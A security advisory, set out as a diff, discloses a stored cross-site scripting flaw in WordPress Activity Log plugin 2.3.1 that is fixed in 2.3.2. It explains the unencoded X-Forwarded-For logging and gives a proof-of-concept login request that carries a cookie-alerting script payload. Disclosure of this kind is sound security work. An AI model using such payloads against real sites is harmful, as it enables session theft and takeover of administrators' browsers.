@@ -1,0 +1,48 @@
+Persistent Cross-Site Scripting in WordPress Activity Log plugin
+Han Sahin
+
+Abstract
+
+A stored Cross-Site Scripting (XSS) vulnerability has been found in the WordPress Activity Log plugin. By using this vulnerability an attacker can inject malicious JavaScript code into the application, which will execute within the browser of any user who views the Activity Log, in general WP admin.
+
+Tested versions
+
+This issue was successfully tested on WordPress Activity Log plugin version 2.3.1.
+
+Fix
+
+This issue has been fixed in version 2.3.2 of the WordPress Activity Log plugin. The updated plugin can be downloaded from the following location: https://downloads.wordpress.org/plugin/aryo-activity-log.2.3.2.zip.
+
+Introduction
+
+The WordPress Activity Log plugin allows monitoring and tracking of site activity on a WordPress site. A stored Cross-Site Scripting vulnerability has been discovered in the WordPress Activity Log plugin which allows an unauthenticated attacker to inject malicious JavaScript code into the application, which will execute within the browser of any user who views the Activity Log (WP admin).
+
+Details
+
+The WordPress Activity Log plugin fails to sufficiently check input supplied to the X-Forwarded-For HTTP header and perform output encoding when the input is presented in a "wrong password event". As a result the malicious request will be stored in the Activity Log page, executing the payload when an unsuspecting user views this specific page.
+
+An attacker can use this vulnerability to perform a wide variety of actions, such as stealing victims' session tokens or login credentials, performing arbitrary actions on their behalf, and logging their keystrokes or deliver malware.
+
+Persistent Cross-Site scripting flaws are typically more serious than reflected vulnerabilities because they do not require a separate delivery mechanism in order to reach target users (victims).
+
+
+Proof of concept
+
+This vulnerability can be demonstrated by submitting an XFF header similar to the following:
+
+POST /wp-login.php HTTP/1.1
+Host: 192.168.28.135
+Content-Length: 113
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8,nl;q=0.6
+X-Forwarded-For: <script>alert(document.cookie);</script>
+Connection: close
+
+log=wordpress&pwd=sdsdssdsdsd&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.28.135%2Fwp-admin%2F&testcookie=1
